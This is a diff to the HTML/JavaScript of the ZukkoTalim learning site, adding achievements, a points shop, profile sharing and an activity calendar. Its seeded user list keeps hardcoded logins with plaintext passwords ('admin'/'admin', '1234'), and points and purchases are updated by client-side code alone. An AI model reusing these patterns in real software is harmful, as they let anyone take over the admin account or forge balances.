@@ -1,4 +1,4 @@
-<!-- ZukkoTalim v3.5 (permission banner fixed + no auto-redraw) -->
+<!-- ZukkoTalim v3.6 (achievements + shop + public profiles + activity calendar) -->
 <!DOCTYPE html>
 <html lang="uz">
 <head>
@@ -56,6 +56,23 @@ body.light-mode .skeleton{background:linear-gradient(90deg,#eaeef2 0%,#d0d7de 50
 .theme-toggle{transition:transform .3s,background .3s}
 .theme-toggle:active{transform:rotate(180deg) scale(.9)}
 .lang-toggle{font-weight:900;font-size:11px;font-family:system-ui,sans-serif}
+/* 🏅 Ачивки */
+.achievement{position:relative;transition:transform .2s,box-shadow .2s;cursor:pointer}
+.achievement:hover{transform:scale(1.05)}
+.achievement.locked{opacity:.35;filter:grayscale(1)}
+.achievement.unlocked{box-shadow:0 0 0 2px #fbbf24,0 0 20px rgba(251,191,36,.3)}
+/* 📅 Календарь */
+.act-cell{width:12px;height:12px;border-radius:2px;transition:transform .15s}
+.act-cell:hover{transform:scale(1.4)}
+.act-0{background:var(--border)}
+.act-1{background:#0e4429}
+.act-2{background:#006d32}
+.act-3{background:#26a641}
+.act-4{background:#39d353}
+body.light-mode .act-0{background:#ebedf0}
+/* 🎁 Тост ачивки */
+@keyframes achievement-pop{0%{transform:translateX(400px);opacity:0}60%{transform:translateX(-10px);opacity:1}100%{transform:translateX(0);opacity:1}}
+.achievement-toast{animation:achievement-pop .6s ease-out}
 body.light-mode .text-white{color:#1f2328 !important}
 body.light-mode .text-slate-300{color:#24292f !important}
 body.light-mode .text-slate-400{color:#57606a !important}
@@ -86,6 +103,7 @@ auth.signInAnonymously().catch(e=>console.warn('Auth:',e));
 <div class="hidden lg:flex gap-5 text-sm font-semibold">
 <button onclick="navigateTo('home')" class="hover:text-blue-400 transition flex items-center gap-2" data-i18n="nav_courses"><i class="fas fa-th-large"></i> Kurslar</button>
 <button onclick="navigateTo('my-courses')" class="hover:text-blue-400 transition flex items-center gap-2" data-i18n="nav_my"><i class="fas fa-play-circle text-indigo-400"></i> Mening</button>
+<button onclick="navigateTo('shop')" class="hover:text-blue-400 transition flex items-center gap-2" data-i18n="nav_shop"><i class="fas fa-shopping-bag text-pink-400"></i> Do'kon</button>
 <button onclick="navigateTo('groups')" class="hover:text-blue-400 transition flex items-center gap-2" data-i18n="nav_groups"><i class="fas fa-users text-teal-400"></i> Guruhlar</button>
 <button onclick="navigateTo('schedule')" class="hover:text-blue-400 transition flex items-center gap-2" data-i18n="nav_schedule"><i class="fas fa-calendar-alt text-purple-400"></i> Jadval</button>
 <button onclick="navigateTo('favorites')" class="hover:text-blue-400 transition flex items-center gap-2" data-i18n="nav_fav"><i class="fas fa-star text-yellow-400"></i> Sevimli</button>
@@ -107,6 +125,7 @@ auth.signInAnonymously().catch(e=>console.warn('Auth:',e));
 <div id="mobileMenu" class="hidden lg:hidden mt-3 pt-3 border-t border-slate-800 flex flex-col gap-1 text-sm font-semibold">
 <button onclick="navigateTo('home');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-th-large w-4 text-center"></i> <span data-i18n="nav_courses">Barcha Kurslar</span></button>
 <button onclick="navigateTo('my-courses');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-play-circle text-indigo-400 w-4 text-center"></i> <span data-i18n="nav_my">Mening Kurslarim</span></button>
+<button onclick="navigateTo('shop');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-shopping-bag text-pink-400 w-4 text-center"></i> <span data-i18n="nav_shop">Do'kon</span></button>
 <button onclick="navigateTo('groups');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-users text-teal-400 w-4 text-center"></i> <span data-i18n="nav_groups">Guruhlar</span></button>
 <button onclick="navigateTo('schedule');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-calendar-alt text-purple-400 w-4 text-center"></i> <span data-i18n="nav_schedule">Jadval</span></button>
 <button onclick="navigateTo('favorites');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-star text-yellow-400 w-4 text-center"></i> <span data-i18n="nav_fav">Sevimli darslar</span></button>
@@ -143,6 +162,29 @@ auth.signInAnonymously().catch(e=>console.warn('Auth:',e));
 <div id="myCoursesGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
 </section>
 
+<section id="pageShop" class="hidden space-y-6">
+<div class="text-center py-8 rounded-2xl bg-gradient-to-r from-pink-900/30 via-slate-900 to-purple-900/30 border border-pink-800/40 shadow-xl">
+<h1 class="text-3xl font-black text-white mb-2 flex items-center justify-center gap-3"><i class="fas fa-shopping-bag text-pink-400"></i> <span data-i18n="shop_title">Ballar do'koni</span></h1>
+<p class="text-slate-400 text-sm" data-i18n="shop_sub">Ballaringizni ajoyib narsalarga almashtiring</p>
+<div class="mt-4 inline-flex items-center gap-3 bg-amber-900/30 border border-amber-700/50 rounded-2xl px-6 py-3">
+<i class="fas fa-coins text-amber-400 text-2xl"></i>
+<span class="text-white font-black text-2xl" id="shopMyPoints">0</span>
+<span class="text-amber-300 text-sm font-bold">ball</span>
+</div></div>
+<div>
+<h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2"><i class="fas fa-palette text-purple-400"></i> <span data-i18n="shop_frames">Avatar ramkalar</span></h2>
+<div id="shopFrames" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4"></div>
+</div>
+<div>
+<h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2"><i class="fas fa-tags text-emerald-400"></i> <span data-i18n="shop_coupons">Kurs chegirmalari</span></h2>
+<div id="shopCoupons" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></div>
+</div>
+<div>
+<h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2"><i class="fas fa-gift text-amber-400"></i> <span data-i18n="shop_others">Boshqa sovg'alar</span></h2>
+<div id="shopOthers" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></div>
+</div>
+</section>
+
 <section id="pageGroups" class="hidden space-y-6">
 <div class="border-b border-slate-800 pb-4">
 <h1 class="text-2xl font-bold text-white flex items-center gap-2"><i class="fas fa-users text-teal-400"></i> <span data-i18n="groups_title">Guruhlar</span></h1>
@@ -162,6 +204,10 @@ auth.signInAnonymously().catch(e=>console.warn('Auth:',e));
 <h1 class="text-2xl font-bold text-white flex items-center gap-2"><i class="fas fa-calendar-alt text-purple-400"></i> <span data-i18n="schedule_title">Darslar jadvali</span></h1>
 <p class="text-xs text-slate-400 mt-1" data-i18n="schedule_sub">Qaysi dars qachon chiqadi</p></div>
 <div id="scheduleList" class="space-y-3"></div>
+</section>
+
+<section id="pagePublicProfile" class="hidden space-y-6">
+<div id="publicProfileContent"></div>
 </section>
 
 <section id="pageAdmin" class="hidden space-y-6">
@@ -357,6 +403,7 @@ auth.signInAnonymously().catch(e=>console.warn('Auth:',e));
 <div class="flex items-center gap-2 flex-wrap">
 <h1 id="profName" class="text-2xl font-bold text-white">...</h1>
 <button onclick="changeUsername()" class="text-blue-400 hover:text-blue-300 text-xs"><i class="fas fa-edit"></i></button>
+<button onclick="shareMyProfile()" class="text-teal-400 hover:text-teal-300 text-xs" title="Ulashish"><i class="fas fa-share-alt"></i></button>
 </div>
 <p id="profId" class="text-xs text-slate-400 mt-0.5">...</p>
 <div id="profStats" class="flex gap-2 mt-2 flex-wrap text-[10px] font-bold"></div>
@@ -369,6 +416,26 @@ auth.signInAnonymously().catch(e=>console.warn('Auth:',e));
 <div class="flex items-center gap-3"><div class="w-9 h-9 bg-amber-500/20 rounded-lg flex items-center justify-center text-amber-400"><i class="fas fa-bell"></i></div>
 <div><p class="text-sm font-bold text-white">Kunlik eslatmalar</p><p id="notifStatus" class="text-xs text-slate-400">Har kuni 19:00 da</p></div></div>
 <button id="notifBtn" onclick="requestPushPermission()" class="bg-amber-500 hover:bg-amber-600 text-slate-900 text-xs font-black px-4 py-2 rounded-lg whitespace-nowrap btn-press"><i class="fas fa-bell mr-1"></i> Yoqish</button></div></div></div>
+
+<div class="card-bg p-6 rounded-2xl space-y-4">
+<h2 class="text-xl font-bold text-white flex items-center gap-2"><i class="fas fa-medal text-amber-400"></i> <span data-i18n="profile_achievements">Yutuqlar</span> <span id="achCountBadge" class="text-xs bg-amber-900/40 text-amber-400 px-2 py-0.5 rounded font-bold ml-2">0/0</span></h2>
+<div id="profAchievements" class="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 gap-3"></div>
+</div>
+
+<div class="card-bg p-6 rounded-2xl space-y-4">
+<h2 class="text-xl font-bold text-white flex items-center gap-2"><i class="fas fa-calendar-check text-emerald-400"></i> <span data-i18n="profile_activity">Faollik</span></h2>
+<div id="activityCalendar" class="overflow-x-auto custom-scrollbar pb-2"></div>
+<div class="flex items-center gap-3 text-[10px] text-slate-500 flex-wrap">
+<span>Kam</span>
+<span class="act-cell act-0"></span>
+<span class="act-cell act-1"></span>
+<span class="act-cell act-2"></span>
+<span class="act-cell act-3"></span>
+<span class="act-cell act-4"></span>
+<span>Ko'p</span>
+</div>
+</div>
+
 <div class="card-bg p-6 rounded-2xl space-y-4">
 <h2 class="text-xl font-bold text-white flex items-center gap-2"><i class="fas fa-shield-alt text-emerald-400"></i> Xavfsizlik</h2>
 <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
@@ -503,6 +570,19 @@ auth.signInAnonymously().catch(e=>console.warn('Auth:',e));
 <p class="text-xs text-center text-slate-400"><span id="authToggleText">Akkauntingiz yo'qmi?</span>
 <button onclick="toggleAuthMode()" id="authToggleBtn" class="text-blue-400 font-bold underline ml-1">Ro'yxatdan o'tish</button></p></div></div>
 
+<div id="shareProfileModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50 modal-backdrop">
+<div class="card-bg w-full max-w-md p-6 rounded-2xl space-y-4 relative modal-content">
+<button onclick="closeShareProfile()" class="absolute top-4 right-4 text-slate-400 hover:text-white"><i class="fas fa-times"></i></button>
+<h2 class="text-xl font-bold text-white text-center"><i class="fas fa-share-alt mr-2 text-teal-400"></i>Profilni ulashish</h2>
+<p class="text-xs text-slate-400 text-center">Sizning shaxsiy havolangizni do'stlaringizga yuboring</p>
+<div class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-2.5 flex items-center gap-2">
+<i class="fas fa-link text-teal-400 text-sm"></i>
+<input type="text" id="shareProfileUrl" readonly class="flex-grow bg-transparent text-xs text-white outline-none font-mono">
+</div>
+<button onclick="copyShareProfile()" class="w-full bg-teal-600 hover:bg-teal-700 text-white font-bold py-3 rounded-xl text-sm btn-press"><i class="fas fa-copy mr-1.5"></i> Havolani nusxalash</button>
+<div id="shareExtraBtns" class="grid grid-cols-3 gap-2"></div>
+</div></div>
+
 <div id="certificateModal" class="hidden fixed inset-0 z-[400] flex items-center justify-center p-4 modal-backdrop" style="background:rgba(0,0,0,.9);backdrop-filter:blur(10px)" onclick="closeCertificate()">
 <div class="relative max-w-4xl w-full modal-content" onclick="event.stopPropagation()">
 <canvas id="certificateCanvas" class="w-full rounded-2xl border-2 border-amber-600 shadow-2xl"></canvas>
@@ -622,8 +702,8 @@ fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{userIP=d.i
 async function hashPassword(p){const m=new TextEncoder().encode(p);const b=await crypto.subtle.digest('SHA-256',m);return Array.from(new Uint8Array(b)).map(x=>x.toString(16).padStart(2,'0')).join('');}
 
 const defaultUsers=[
-{id:'USR-1001',login:'admin',passHash:'8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',passPlain:'admin',role:'admin',balance:500000,tutorsBought:[],payments:[],watchProgress:{},points:0,streakDays:0,lastStreakDay:''},
-{id:'USR-1002',login:'Azizbek',passHash:'03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4',passPlain:'1234',role:'student',balance:200000,tutorsBought:[],payments:[],watchProgress:{},points:0,streakDays:0,lastStreakDay:''}];
+{id:'USR-1001',login:'admin',passHash:'8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',passPlain:'admin',role:'admin',balance:500000,tutorsBought:[],payments:[],watchProgress:{},points:0,streakDays:0,lastStreakDay:'',achievements:{},purchases:[]},
+{id:'USR-1002',login:'Azizbek',passHash:'03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4',passPlain:'1234',role:'student',balance:200000,tutorsBought:[],payments:[],watchProgress:{},points:0,streakDays:0,lastStreakDay:'',achievements:{},purchases:[]}];
 const defaultTutors=[
 {id:'tut-1',name:'Ibat',subject:'Ingliz tili',sinf:'Umumiy',price:90000,order:1,img:'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=400&auto=format&fit=crop',
 lessons:[{id:'l1',title:'1-Dars. English Alphabet',url:'https://player.vimeo.com/video/1226105435'},{id:'l2',title:'2-Dars. Present Simple',url:'https://player.vimeo.com/video/1226105435'}]},
@@ -644,6 +724,7 @@ let _lastBroadcastSeen=localStorage.getItem('edu_lastBroadcast')||'';
 let _deferredInstallPrompt=null;
 let _lastTutorsHash='',_lastProfileHash='';
 let _saveQueue={};
+let _shopFilter='all';
 
 const LEVELS=[
 {min:0,name:'Yangi',emoji:'🌱',color:'text-slate-400',bg:'bg-slate-800'},
@@ -654,10 +735,202 @@ const LEVELS=[
 function getLevel(p){let lv=LEVELS[0];for(const l of LEVELS){if(p>=l.min)lv=l;}return lv;}
 function getNextLevel(p){for(const l of LEVELS){if(p<l.min)return l;}return null;}
 
+// ===== 🏅 АЧИВКИ (15 штук) =====
+const ACHIEVEMENTS=[
+{id:'first_login',name:'Ilk qadam',desc:'Birinchi marta kirdingiz',icon:'🌱',cat:'start'},
+{id:'first_course',name:'Birinchi kurs',desc:'1-kurs xarid qildingiz',icon:'📚',cat:'course'},
+{id:'five_courses',name:"5 kurs egasi",desc:"5 ta kurs xarid",icon:'🎓',cat:'course'},
+{id:'ten_courses',name:'Kurs kolleksioneri',desc:"10 ta kurs xarid",icon:'👑',cat:'course'},
+{id:'first_lesson',name:'Birinchi dars',desc:'1-dars tugatildi',icon:'✅',cat:'watch'},
+{id:'ten_lessons',name:"10 ta dars",desc:"10 dars tugatildi",icon:'📖',cat:'watch'},
+{id:'hundred_lessons',name:'100 dars',desc:'100 dars tugatildi',icon:'🏆',cat:'watch'},
+{id:'streak_7',name:'1 hafta',desc:"7 kun ketma-ket o'qish",icon:'🔥',cat:'streak'},
+{id:'streak_30',name:'1 oy',desc:"30 kun ketma-ket o'qish",icon:'💎',cat:'streak'},
+{id:'points_100',name:'100 ball',desc:'100 ball to\'plandi',icon:'🪙',cat:'points'},
+{id:'points_500',name:'500 ball',desc:'500 ball to\'plandi',icon:'💰',cat:'points'},
+{id:'points_1000',name:'1000 ball',desc:'1000 ball to\'plandi',icon:'💎',cat:'points'},
+{id:'quiz_master',name:'Test ustasi',desc:'5 ta test topshirildi',icon:'🧠',cat:'quiz'},
+{id:'homework_5',name:'Uy ishi ustasi',desc:'5 ta uy ishi topshirildi',icon:'✍️',cat:'homework'},
+{id:'level_ustoz',name:'Ustoz darajasi',desc:"Ustoz darajasiga chiqdingiz",icon:'⭐',cat:'level'}
+];
+function getAchievement(id){return ACHIEVEMENTS.find(a=>a.id===id);}
+
+// Проверка всех ачивок после любого события
+function checkAchievements(){
+if(!db.currentUser)return;
+const u=db.currentUser;
+if(!u.achievements)u.achievements={};
+const newOnes=[];
+const grant=(id)=>{if(!u.achievements[id]){u.achievements[id]={at:new Date().toISOString()};newOnes.push(id);}};
+
+// Login
+grant('first_login');
+// Courses
+const coursesCount=(u.tutorsBought||[]).length;
+if(coursesCount>=1)grant('first_course');
+if(coursesCount>=5)grant('five_courses');
+if(coursesCount>=10)grant('ten_courses');
+// Watched lessons
+let watched=0;
+db.tutors.forEach(t=>{if(u.tutorsBought&&u.tutorsBought.includes(t.id)){(t.lessons||[]).forEach((l,i)=>{if(localStorage.getItem('awarded_'+u.id+'_'+t.id+'_'+i))watched++;});}});
+if(watched>=1)grant('first_lesson');
+if(watched>=10)grant('ten_lessons');
+if(watched>=100)grant('hundred_lessons');
+// Streak
+const streak=u.streakDays||0;
+if(streak>=7)grant('streak_7');
+if(streak>=30)grant('streak_30');
+// Points
+const points=u.points||0;
+if(points>=100)grant('points_100');
+if(points>=500)grant('points_500');
+if(points>=1000)grant('points_1000');
+// Quiz
+const quizCount=Object.keys(u.quizPassed||{}).length;
+if(quizCount>=5)grant('quiz_master');
+// Homework — считаем по факту в Firebase (упрощённо, по флагу)
+if((u.homeworkCount||0)>=5)grant('homework_5');
+// Level
+const lv=getLevel(points);
+if(points>=500)grant('level_ustoz');
+
+if(newOnes.length>0){
+const idx=db.users.findIndex(x=>x.id===u.id);
+if(idx!==-1)db.users[idx]=u;
+db.currentUser=u;
+localStorage.setItem('db_currentUser',JSON.stringify(u));
+database.ref('users/'+u.id+'/achievements').set(u.achievements);
+newOnes.forEach((id,i)=>{setTimeout(()=>{showAchievementToast(id);},i*1200);});
+if(!document.getElementById('pageProfile').classList.contains('hidden'))renderProfile();
+}
+}
+function showAchievementToast(id){
+const a=getAchievement(id);if(!a)return;
+const el=document.createElement('div');
+el.className='fixed top-20 right-5 z-[998] bg-gradient-to-r from-amber-600 to-orange-600 text-white rounded-2xl px-5 py-4 shadow-2xl border-2 border-amber-300 achievement-toast max-w-[320px]';
+el.innerHTML=`<div class="flex items-center gap-3">
+<div class="text-4xl">${a.icon}</div>
+<div><p class="text-[10px] font-bold uppercase text-amber-100">Yangi yutuq!</p>
+<p class="font-black text-base">${escapeHtml(a.name)}</p>
+<p class="text-[11px] text-amber-100">${escapeHtml(a.desc)}</p></div></div>`;
+document.body.appendChild(el);
+try{new Notification('🏅 Yangi yutuq!',{body:a.icon+' '+a.name,icon:'icon-192.png',tag:'ach-'+id});}catch(e){}
+fireConfetti();
+setTimeout(()=>el.remove(),5000);
+}
+
+// ===== 🛒 МАГАЗИН =====
+const SHOP_ITEMS=[
+// Рамки аватара
+{id:'frame_gold',name:'Oltin ramka',desc:'Profilingiz oltin rangda',icon:'👑',price:100,cat:'frame',color:'#fbbf24'},
+{id:'frame_fire',name:'Olovli ramka',desc:'Qizil olov ramkasi',icon:'🔥',price:150,cat:'frame',color:'#ef4444'},
+{id:'frame_rainbow',name:'Kamalak ramka',desc:'Rangli animatsiya',icon:'🌈',price:250,cat:'frame',color:'#ec4899'},
+{id:'frame_legend',name:'Legenda ramkasi',desc:'Eng zo\'r ramka',icon:'💎',price:500,cat:'frame',color:'#8b5cf6'},
+// Скидки на курсы
+{id:'disc_10',name:'-10% chegirma',desc:'Kurs uchun chegirma',icon:'🏷️',price:200,cat:'coupon',discount:10},
+{id:'disc_25',name:'-25% chegirma',desc:'Kuchli chegirma',icon:'🎯',price:400,cat:'coupon',discount:25},
+{id:'disc_50',name:'-50% chegirma',desc:'Yarim narx',icon:'⚡',price:700,cat:'coupon',discount:50},
+// Прочее
+{id:'change_login',name:'Login o\'zgartirish',desc:'Bepul login o\'zgartirish',icon:'✏️',price:300,cat:'other'},
+{id:'boost_profile',name:'Profil boost',desc:'24 soat TOP-10 da ko\'rinish',icon:'🚀',price:150,cat:'other'},
+{id:'incognito',name:'Incognito',desc:'Admin sizni ko\'rmaydi (24 soat)',icon:'🕶️',price:500,cat:'other'}
+];
+function getShopItem(id){return SHOP_ITEMS.find(x=>x.id===id);}
+
+function renderShop(){
+const pointsEl=document.getElementById('shopMyPoints');
+if(pointsEl)pointsEl.textContent=(db.currentUser&&db.currentUser.points)||0;
+const owned=(db.currentUser&&db.currentUser.purchases)||[];
+const activeFrame=db.currentUser&&db.currentUser.activeFrame;
+
+// Frames
+const framesEl=document.getElementById('shopFrames');
+if(framesEl){
+framesEl.innerHTML=SHOP_ITEMS.filter(i=>i.cat==='frame').map(item=>{
+const isOwned=owned.includes(item.id);
+const isActive=activeFrame===item.id;
+return `<div class="card-bg p-4 rounded-2xl text-center hover-lift transition">
+<div class="w-20 h-20 mx-auto rounded-full flex items-center justify-center text-4xl mb-3" style="box-shadow:0 0 0 4px ${item.color}, 0 0 20px ${item.color}80; background:var(--card);">
+${item.icon}</div>
+<p class="font-bold text-white text-sm">${escapeHtml(item.name)}</p>
+<p class="text-[10px] text-slate-400 mb-3">${escapeHtml(item.desc)}</p>
+${isOwned?`<button onclick="setActiveFrame('${item.id}')" class="w-full ${isActive?'bg-emerald-600':'bg-slate-700 hover:bg-slate-600'} text-white text-xs font-bold py-2 rounded-lg btn-press">${isActive?'✅ Faol':'O\'rnatish'}</button>`:
+`<button onclick="buyShopItem('${item.id}')" class="w-full bg-pink-600 hover:bg-pink-700 text-white text-xs font-bold py-2 rounded-lg btn-press">🪙 ${item.price}</button>`}
+</div>`;}).join('');
+}
+
+// Coupons
+const coupEl=document.getElementById('shopCoupons');
+if(coupEl){
+coupEl.innerHTML=SHOP_ITEMS.filter(i=>i.cat==='coupon').map(item=>{
+const cnt=(db.currentUser&&db.currentUser.coupons&&db.currentUser.coupons[item.id])||0;
+return `<div class="card-bg p-4 rounded-2xl flex items-center gap-4 hover-lift transition">
+<div class="w-14 h-14 rounded-xl bg-gradient-to-br from-emerald-600 to-teal-600 flex items-center justify-center text-2xl shrink-0">${item.icon}</div>
+<div class="flex-grow min-w-0"><p class="font-bold text-white text-sm">${escapeHtml(item.name)}</p>
+<p class="text-[10px] text-slate-400">${escapeHtml(item.desc)}</p>
+${cnt>0?`<span class="text-[10px] text-emerald-400 font-bold">Sizda: ${cnt} ta</span>`:''}
+</div>
+<button onclick="buyShopItem('${item.id}')" class="bg-pink-600 hover:bg-pink-700 text-white text-xs font-bold px-3 py-2 rounded-lg whitespace-nowrap btn-press shrink-0">🪙 ${item.price}</button>
+</div>`;}).join('');
+}
+
+// Others
+const otherEl=document.getElementById('shopOthers');
+if(otherEl){
+otherEl.innerHTML=SHOP_ITEMS.filter(i=>i.cat==='other').map(item=>{
+const isOwned=owned.includes(item.id);
+return `<div class="card-bg p-4 rounded-2xl flex items-center gap-4 hover-lift transition">
+<div class="w-14 h-14 rounded-xl bg-gradient-to-br from-purple-600 to-indigo-600 flex items-center justify-center text-2xl shrink-0">${item.icon}</div>
+<div class="flex-grow min-w-0"><p class="font-bold text-white text-sm">${escapeHtml(item.name)}</p>
+<p class="text-[10px] text-slate-400">${escapeHtml(item.desc)}</p></div>
+${isOwned?`<span class="text-emerald-400 text-xs font-bold">✅ Sotib olingan</span>`:
+`<button onclick="buyShopItem('${item.id}')" class="bg-pink-600 hover:bg-pink-700 text-white text-xs font-bold px-3 py-2 rounded-lg whitespace-nowrap btn-press shrink-0">🪙 ${item.price}</button>`}
+</div>`;}).join('');
+}
+}
+
+function buyShopItem(id){
+if(!db.currentUser){openAuthModal();return;}
+const item=getShopItem(id);if(!item)return;
+const u=db.currentUser;
+const curPoints=u.points||0;
+if(curPoints<item.price){toast('❌ Ballar yetarli emas. Kerak: '+item.price);return;}
+if(!confirm('"'+item.name+'" sotib olinsinmi?\n\nNarxi: '+item.price+' ball\nSizda: '+curPoints+' ball'))return;
+u.points=curPoints-item.price;
+if(!u.purchases)u.purchases=[];
+if(!u.coupons)u.coupons={};
+if(item.cat==='coupon'){
+u.coupons[id]=(u.coupons[id]||0)+1;
+}else{
+if(!u.purchases.includes(id))u.purchases.push(id);
+}
+if(item.cat==='frame')u.activeFrame=id;
+u.shopLog=[{item:id,price:item.price,at:new Date().toISOString()},...(u.shopLog||[])];
+if(u.shopLog.length>30)u.shopLog=u.shopLog.slice(0,30);
+const idx=db.users.findIndex(x=>x.id===u.id);if(idx!==-1)db.users[idx]=u;
+db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
+saveUserToDb(u);
+fireConfetti();
+toast('✅ '+item.name+' sotib olindi!');
+renderShop();
+renderProfile();
+}
+function setActiveFrame(id){
+if(!db.currentUser)return;
+const u=db.currentUser;
+if(!u.purchases||!u.purchases.includes(id)){toast('❌ Sizda bu ramka yo\'q');return;}
+u.activeFrame=id;
+const idx=db.users.findIndex(x=>x.id===u.id);if(idx!==-1)db.users[idx]=u;
+db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
+saveUserToDb(u);
+toast('✅ Ramka o\'rnatildi!');
+renderShop();renderProfile();
+}
+
 // ===== 🌐 ЯЗЫК =====
 const I18N={
-uz:{nav_courses:'Kurslar',nav_my:'Mening',nav_groups:'Guruhlar',nav_schedule:'Jadval',nav_fav:'Sevimli',nav_top:'TOP-10',nav_profile:'Profilim',hero_title:"ZukkoTalim — Sifatli Ta'lim",hero_sub:"O'zingizga mos kurslarni tanlang va bilim oling!",search_ph:'Dars, kurs yoki mavzu qidirish...',filter_class:'📌 Sinf:',filter_subject:'📚 Fan:',courses_title:'Kurslar',my_courses_title:'Mening Kurslarim',my_courses_sub:'Xarid qilgan kurslaringiz',groups_title:'Guruhlar',groups_sub:"Siz a'zo bo'lgan guruhlar",fav_title:'Sevimli darslar',fav_sub:"Belgilangan (⭐) darslar ro'yxati",schedule_title:'Darslar jadvali',schedule_sub:'Qaysi dars qachon chiqadi'},
-ru:{nav_courses:'Курсы',nav_my:'Мои',nav_groups:'Группы',nav_schedule:'Расписание',nav_fav:'Избранное',nav_top:'TOP-10',nav_profile:'Профиль',hero_title:'ZukkoTalim — Качественное образование',hero_sub:'Выберите подходящие курсы и учитесь!',search_ph:'Поиск урока, курса или темы...',filter_class:'📌 Класс:',filter_subject:'📚 Предмет:',courses_title:'Курсы',my_courses_title:'Мои курсы',my_courses_sub:'Купленные вами курсы',groups_title:'Группы',groups_sub:'Группы, в которых вы состоите',fav_title:'Избранные уроки',fav_sub:'Список отмеченных (⭐) уроков',schedule_title:'Расписание уроков',schedule_sub:'Какой урок когда выходит'}};
+uz:{nav_courses:'Kurslar',nav_my:'Mening',nav_shop:"Do'kon",nav_groups:'Guruhlar',nav_schedule:'Jadval',nav_fav:'Sevimli',nav_top:'TOP-10',nav_profile:'Profilim',hero_title:"ZukkoTalim — Sifatli Ta'lim",hero_sub:"O'zingizga mos kurslarni tanlang va bilim oling!",search_ph:'Dars, kurs yoki mavzu qidirish...',filter_class:'📌 Sinf:',filter_subject:'📚 Fan:',courses_title:'Kurslar',my_courses_title:'Mening Kurslarim',my_courses_sub:'Xarid qilgan kurslaringiz',shop_title:"Ballar do'koni",shop_sub:'Ballaringizni ajoyib narsalarga almashtiring',shop_frames:'Avatar ramkalar',shop_coupons:'Kurs chegirmalari',shop_others:"Boshqa sovg'alar",groups_title:'Guruhlar',groups_sub:"Siz a'zo bo'lgan guruhlar",fav_title:'Sevimli darslar',fav_sub:"Belgilangan (⭐) darslar ro'yxati",schedule_title:'Darslar jadvali',schedule_sub:'Qaysi dars qachon chiqadi',profile_achievements:'Yutuqlar',profile_activity:'Faollik'},
+ru:{nav_courses:'Курсы',nav_my:'Мои',nav_shop:'Магазин',nav_groups:'Группы',nav_schedule:'Расписание',nav_fav:'Избранное',nav_top:'TOP-10',nav_profile:'Профиль',hero_title:'ZukkoTalim — Качественное образование',hero_sub:'Выберите подходящие курсы и учитесь!',search_ph:'Поиск урока, курса или темы...',filter_class:'📌 Класс:',filter_subject:'📚 Предмет:',courses_title:'Курсы',my_courses_title:'Мои курсы',my_courses_sub:'Купленные вами курсы',shop_title:'Магазин баллов',shop_sub:'Обменяйте баллы на крутые вещи',shop_frames:'Рамки аватара',shop_coupons:'Скидки на курсы',shop_others:'Другие подарки',groups_title:'Группы',groups_sub:'Группы, в которых вы состоите',fav_title:'Избранные уроки',fav_sub:'Список отмеченных (⭐) уроков',schedule_title:'Расписание уроков',schedule_sub:'Какой урок когда выходит',profile_achievements:'Достижения',profile_activity:'Активность'}};
 function toggleLang(){const cur=localStorage.getItem('edu_lang')||'uz';const next=cur==='uz'?'ru':'uz';applyLang(next);}
 function applyLang(lang){
 localStorage.setItem('edu_lang',lang);
@@ -714,7 +987,9 @@ updates.pointsLog=[{amount,reason,at:new Date().toISOString()},...(cur.pointsLog
 if(updates.pointsLog.length>30)updates.pointsLog=updates.pointsLog.slice(0,30);
 updateSubject(updates);
 if(newLv.min>oldLv.min){setTimeout(()=>{toast(newLv.emoji+' Yangi daraja: '+newLv.name+'!');fireConfetti();},500);}
-else{setTimeout(()=>{toast('🪙 +'+amount+' ball. Jami: '+after);},300);}}
+else{setTimeout(()=>{toast('🪙 +'+amount+' ball. Jami: '+after);},300);}
+setTimeout(checkAchievements,800);
+}
 function updateStreak(){
 if(!db.currentUser)return;const u=db.users.find(x=>x.id===db.currentUser.id);if(!u)return;
 const today=new Date();today.setHours(0,0,0,0);const todayStr=today.toISOString().slice(0,10);
@@ -727,7 +1002,8 @@ const idx=db.users.findIndex(x=>x.id===u.id);if(idx!==-1)db.users[idx]=u;
 db.currentUser=u;localStorage.setItem('db_currentUser',JSON.stringify(u));
 database.ref('users/'+u.id+'/streakDays').set(u.streakDays);
 database.ref('users/'+u.id+'/lastStreakDay').set(u.lastStreakDay);
-if(u.streakDays>=2){setTimeout(()=>{toast('🔥 '+u.streakDays+' kun ketma-ket!');},800);}}}
+if(u.streakDays>=2){setTimeout(()=>{toast('🔥 '+u.streakDays+' kun ketma-ket!');},800);}
+setTimeout(checkAchievements,1000);}}
 function retroactivePoints(){
